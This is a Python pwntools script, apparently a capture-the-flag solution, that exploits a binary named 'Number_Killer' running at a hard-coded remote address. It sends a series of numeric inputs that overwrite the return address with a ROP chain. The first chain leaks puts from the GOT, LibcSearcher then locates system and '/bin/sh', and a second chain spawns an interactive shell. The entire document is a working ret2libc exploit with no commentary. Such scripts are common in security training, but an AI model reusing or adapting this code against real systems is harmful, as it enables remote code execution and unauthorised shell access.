from pwn import*
from LibcSearcher import*
context.log_level = 'debug'
p = remote('47.103.214.163',20001)
#p = process('./Number_Killer')
elf = ELF('Number_Killer')
p.recvuntil("Let's Pwn me with numbers!")
pop_rdi_ret = 0x400803 #4196355
main_addr = 0x4006F6 #4196086
puts_plt = 0x40051C #4195612
puts_got = 0x601018 #6295576
for i in range(0,11):
	p.sendline('0')
p.sendline('47244640256')
p.sendline('0')
p.sendline('4196355')
p.sendline('6295576')
p.sendline('4195612')
p.sendline('4196086')
p.sendline('0')
p.sendline('0')
p.sendline('0')
p.recvline()
puts_addr = u64(p.recv(6).ljust(8,'\x00'))
log.success('Puts_Addr:\t' + hex(puts_addr))
libc = LibcSearcher('puts',puts_addr)
libcbase = puts_addr - libc.dump('puts')
system_addr = libcbase + libc.dump('system')
binsh_addr = libcbase+libc.dump('str_bin_sh')

for i in range(0,11):
	p.sendline('0')
p.sendline('47244640256')
p.sendline('0')
p.sendline(str(int(hex(pop_rdi_ret),16)))
p.sendline(str(int(hex(binsh_addr),16)))
p.sendline(str(int(hex(system_addr),16)))
p.sendline('0')
p.sendline('0')
p.sendline('0')
p.sendline('0')
p.interactive()

